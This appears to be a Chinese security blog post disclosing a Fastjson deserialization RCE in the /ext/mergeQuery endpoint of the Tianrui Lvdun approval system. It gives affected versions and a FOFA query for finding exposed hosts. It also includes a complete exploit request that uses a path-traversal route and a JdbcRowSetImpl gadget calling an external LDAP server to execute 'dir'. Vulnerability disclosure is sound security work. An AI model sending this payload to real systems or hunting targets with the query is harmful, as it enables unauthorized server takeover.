---
title: "天锐绿盾审批系统 /ext/mergeQuery fastjson反序列化漏洞"
source: https://mrxn.net/jswz/trwfe-mergeQuery-rce.html
asset_dir: assets/天锐绿盾审批系统-extmergequery-fastjson反序列化漏洞
---

# 天锐绿盾审批系统 /ext/mergeQuery fastjson反序列化漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/12/26 08:20
- 282浏览
- [0评论](#comment)
- 11分钟阅读

深入探索

网络安全会议

安全认证考试

Web安全课程

---

# 漏洞简介

天锐绿盾审批系统是一款企业级数据防泄密（DLP）解决方案，主要用于对企业内部的敏感文件进行透明加密、权限管理以及审批流程控制，旨在防止数据泄露并保障信息安全。

漏洞扫描服务

该系统的 `/ext/mergeQuery` 接口存在 Fastjson 反序列化漏洞。攻击者可以通过构造恶意的 JSON 数据包，利用 Fastjson 库在处理数据时存在的反序列化缺陷，在未经授权的情况下，在服务器端[执行任意代码](https://mrxn.net/tag/rce)。

成功利用此漏洞可能导致服务器被完全控制，攻击者可以窃取敏感数据、植入恶意程序、篡改系统配置，甚至对整个企业网络造成严重破坏，对企业的业务连续性和数据安全构成重大威胁。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"
>
> 安全研究工具

# 漏洞分析

先看下fastjson的版本

[![天锐绿盾审批系统 /ext/mergeQuery fastjson反序列化漏洞](images/img-001-12acc584d0c7.webp)](https://image.mrxn.net/e5600a3fa3934c91a581bd60de9fe93f.webp)

1.2.7版本，不是最新版，是存在反序列化[rce](https://mrxn.net/tag/rce)漏洞的。

深入探索

安全工具开发

云安全解决方案

漏洞扫描器

再看`/ext/mergeQuery` 的实现部分

[![天锐绿盾审批系统 /ext/mergeQuery fastjson反序列化漏洞](images/img-002-2097ef06c3a8.webp)](https://image.mrxn.net/9a104b3009be42d2b5c94420c563f861.webp)

请求body的**requestBody**被直接用于`JSONObject.parseObject`进行反序列化操作，非常明显的fastjson反序列化漏洞没啥好分析的。

深入探索

编码转换工具

VPN服务

物流软件安全

# 漏洞复现

使用`Java Chains`的`JNDILDAPDeserializePayload`下的`Fastjson反序列化链`配合`One For All Echo 回显`来完成利用

网络安全

[![天锐绿盾审批系统 /ext/mergeQuery fastjson反序列化漏洞](images/img-003-50d63f56dabb.webp)](https://image.mrxn.net/7738ff2258da4d508687f6ab7e38aa4d.webp)

```
POST /trwfe/login.jsp/.%2e/rest/ext/mergeQuery HTTP/1.1
Host: trwfe.mrxn.net
X-Authorization: dir
Content-Type: application/json

[
    {
        "requestType": "trusteeMsg",
        "requestBody": {
            "userId": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "ldap://192.168.168.11:50389/165c51",
                "autoCommit": true
            },
            "createTime": "2023-01-01"
        }
    }
]
```

成功执行`dir`命令 并回显[命令执行](https://mrxn.net/tag/rce)结果

[![天锐绿盾审批系统 /ext/mergeQuery fastjson反序列化漏洞](images/img-004-c5e0bfc80b36.webp)](https://image.mrxn.net/43ca122d98a34c7a8d7fe6c755f716e1.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
